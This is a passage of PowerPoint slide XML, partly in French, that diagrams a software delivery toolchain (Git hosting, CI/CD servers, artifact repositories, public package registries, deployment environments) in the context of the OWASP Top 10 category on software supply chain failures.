            <a:off x="7573907" y="2240499"/>
            <a:ext cx="1716740" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>repo1.maven.org…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B905B87-A304-88D7-8883-8141D35238D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1948018"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>npmjs.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="ZoneTexte 48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD13EE6B-CE3A-C5D8-A033-03EDE5AD07F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1655536"/>
            <a:ext cx="1091060" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>pypi.org</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="ZoneTexte 50">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7A0EFC2-AAC4-27D9-0235-588051127458}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3042841" y="5450856"/>
            <a:ext cx="6105524" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Almost every other category describes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>flaw in the application you build</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = a property of your own code or configuration that an external attacker exploits, typically against the deployed app at runtime</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Accolade ouvrante 51">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF1C467C-13E2-78CE-7AC1-AE28192450EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9715500" y="4046194"/>
            <a:ext cx="144000" cy="288000"/>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3" name="Accolade fermante 52">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2549CDBB-C971-51FE-751C-DEA8481BE060}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10841926" y="4034851"/>
            <a:ext cx="144000" cy="288000"/>
          </a:xfrm>
          <a:prstGeom prst="righ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752253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DD5CAEAC-5FF1-49A9-FB33-1EB6EC934451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Artifact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t> repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 2" descr="Laptop - Free computer icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0A7F49D-CEDA-A69C-E795-2E0B1BB9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907" y="398018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omputer User Icon SVG Vector &amp; PNG Free Download | UXWing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA229DC-64A1-3C28-0A67-A9E668AB0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96" y="3928753"/>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510B108-4448-584B-98DE-4F0FEBAF8C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="708995" y="3608499"/>
            <a:ext cx="162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sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="ZoneTexte 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312A2F29-67DD-5968-4606-374A40927116}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2997299" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Git </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>hosting</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ZoneTexte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4197F436-9B68-5943-F8EA-619CACCE74C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5285603" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>CI/CD server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="ZoneTexte 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E48FFC5F-6896-1D63-BE8B-822A3832A505}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="3608499"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>Environments</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B027055-1F12-8023-5728-A04C88DF962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4257299"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18" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E64E33E5-899D-9422-4876-21845D2182DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378"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9" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD0B1EE3-0B75-71F2-0975-A3BB67206273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="298330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0" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FF6CCA8-9822-17B7-026C-B8E4A20C950A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5270226"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1" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{222F2DA7-4EA3-01EA-6572-25BE2BA803C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7557150"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2" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{949B3B62-9214-0952-5834-3E9B95D5188D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984407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23" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14DE835D-AEEA-9024-0C6C-E33AB13F7B1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6545603"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cônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E384E84D-A866-8821-5661-9158148958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Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED3ADEDD-DF1B-B74A-9477-2C34A792CAC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11122212"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26" name="Nuage 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95C94FBA-D78F-B992-4290-F90726B610D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796118" y="304956"/>
            <a:ext cx="7395882" cy="287121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D5FC046C-A840-4AA5-F27C-908077766201}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696378" y="3319615"/>
            <a:ext cx="10875694"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A1DB742D-1D77-160D-7D4B-4D00C049810A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7573907" y="1258737"/>
            <a:ext cx="1620000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>Public repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1F58C00-6975-1811-4EFB-5D8F411A1FF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755715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31" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29829A64-D2D0-2417-77BB-54DDB5926A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a:xfrm>
            <a:off x="472251" y="349793"/>
            <a:ext cx="11016000" cy="257220"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Forge logicielle, Plateforme d’Intégration Continue, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Toolchain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> – OWASP top 10 vs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t>A03:2025 Software Supply Chain Failures</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> 2/2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="ZoneTexte 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C0EEA62-BCA7-898B-A594-768DAEAE162C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4018376"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Production</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="ZoneTexte 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76286828-63B3-EF29-1A3A-59E0A8466CBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4299772"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Qualification</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="ZoneTexte 33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0565DC4C-8864-401B-FFBC-275748762BAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9862212" y="4581167"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Dev…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="ZoneTexte 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BEF6735-DB9E-FCAE-86FB-A5E1A3C13258}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4018376"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Nexus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="ZoneTexte 35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B7A6DE1-174B-F4AA-141B-69B4529B4F7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4312690"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Artifactory</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="ZoneTexte 36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7660C74C-8019-8B13-CA9B-6C079A981054}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566052" y="4607005"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="ZoneTexte 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{950EAC1C-5F6B-662D-9D84-11F0F4A78D81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281843" y="4004139"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Jenkins</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="ZoneTexte 38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{028E0F3A-0BAB-4D5D-17C9-BF89719A004C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281843" y="4298453"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GitLab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> ci</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="ZoneTexte 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17BCE7EA-6D03-5781-F5DB-C7F35713AA75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5281842" y="4592768"/>
            <a:ext cx="1535517" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>GitHub actions…</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="ZoneTexte 40">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC1C30FF-9B7E-2AA5-835C-F300653F169D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020823" y="4002359"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GitLab</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="ZoneTexte 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00E746E7-6ECE-9DDF-C858-4D96C1B39B44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3020823" y="4296673"/>
            <a:ext cx="1152000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>GiHub</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
